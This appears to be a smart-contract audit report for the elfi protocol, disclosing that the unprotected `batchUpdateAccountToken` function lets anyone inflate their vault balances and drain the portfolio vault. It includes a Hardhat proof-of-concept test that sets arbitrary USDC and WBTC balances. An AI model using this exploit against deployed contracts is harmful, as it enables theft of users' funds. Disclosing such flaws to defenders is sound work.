Active Punch Jellyfish

High

# Anyone can change the balance of an account to drain the entire portfolio vault

## Summary
Anyone can call `batchUpdateAccountToken` to update their balance in portfolio vault without depositing the tokens. 
## Vulnerability Detail
Simply call the function with desired amounts and withdraw the funds from portfolio vault

**Coded PoC:**
```typescript
it("Anyone Can change the balance as wish", async function () {
		const usdcAmount = precision.token(1000, 6);
		// do this so that the user0 account is exists
		await deposit(fixture, {
			account: user0,
			token: usdc,
			amount: usdcAmount,
		});

		// change the balance as you wish
		const updateAccParams = {
			account: user0.address,
			tokens: [usdcAddr, wbtcAddr],
			changedTokenAmounts: [
				precision.token(100_000, 6), // USDC with 6 decimals
				precision.token(100), // WBTC with default 18 decimals
			],
		};

		await accountFacet.connect(user0).batchUpdateAccountToken(updateAccParams);

		const accountInfo = await accountFacet.getAccountInfo(user0.address);
		console.log(
			"Account info before execute and after create request",
			accountInfo
		);
	});
```
## Impact
All funds in portfolio vault can be drained. 
## Code Snippet
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/facets/AccountFacet.sol#L68-L71
## Tool used

Manual Review

## Recommendation
I am guessing this function should not be existed and here for test purposes, missing access control or missing the actual token transfer. Without knowing the exact reason why this function is here it is not possible to give any recommendations. 